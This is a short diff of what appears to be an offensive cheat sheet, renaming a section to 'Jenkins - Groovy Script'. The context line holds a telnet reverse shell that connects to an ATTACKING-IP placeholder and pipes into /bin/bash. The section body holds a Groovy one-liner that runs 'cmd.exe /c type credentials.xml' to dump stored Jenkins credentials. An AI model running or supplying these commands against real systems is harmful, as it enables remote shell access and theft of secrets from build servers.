@@ -81,7 +81,7 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 
 ---------------------------------------------------------------------------------------------------------------------------------------
 
-# Groovy:
+# Jenkins - Groovy Script:
 
 Extract Credentials:
 def sout = new StringBuffer(), serr = new StringBuffer();def proc = 'cmd.exe /c type credentials.xml'.execute();proc.consumeProcessOutput(sout, serr);proc.waitForOrKill(1000);println "out> $sout err> $serr"
